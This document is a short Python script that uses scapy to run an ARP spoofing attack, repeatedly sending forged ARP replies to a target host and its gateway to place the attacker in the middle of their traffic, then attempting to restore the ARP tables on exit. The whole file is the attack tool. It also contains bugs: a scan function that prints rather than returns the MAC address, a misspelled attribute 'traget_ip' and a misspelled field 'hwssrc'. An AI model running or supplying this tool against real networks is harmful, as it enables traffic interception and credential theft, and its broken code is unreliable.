import scapy.all as scapy
import optparse
import time

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP Address: ")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP Address: ")
    options = parse_object.parse_args()[0]
    if not options.target_ip:
        print("Enter target ip address: ")
    if not options.gateway_ip:
        print("Enter gateway ip address: ")
        return options


def user_scan(ip):
    arp_pockets = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_pockets
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    print(answered_list[0] [1].hwsrc)


def arp_poisoning(target_ip, gateway_ip):
    target_mac = user_scan(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(arp_response, verbose=False)


def operation_reset(ip_1, ip_2):
    target_mac = user_scan(ip_1)
    gateway_mac =  user_scan(ip_2)
    arp_response = scapy.ARP(op=2, pdst=ip_1, hwdst=target_mac, psrc=ip_2, hwssrc=gateway_mac)
    scapy.send(arp_response, verbose=False,count=8)

number = 0

user_ips = get_user_input()
user_target_ip = user_ips.traget_ip
user_gateway_ip = user_ips.gateway_ip
try:
    while True:
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        number += 2
        print("\rSending Packets " + str(number), end="")
        time.sleep(4)
except KeyboardInterrupt:
    print("\nQuit and Reset")
    operation_reset(user_target_ip, user_gateway_ip)
    operation_reset(user_gateway_ip, user_target_ip)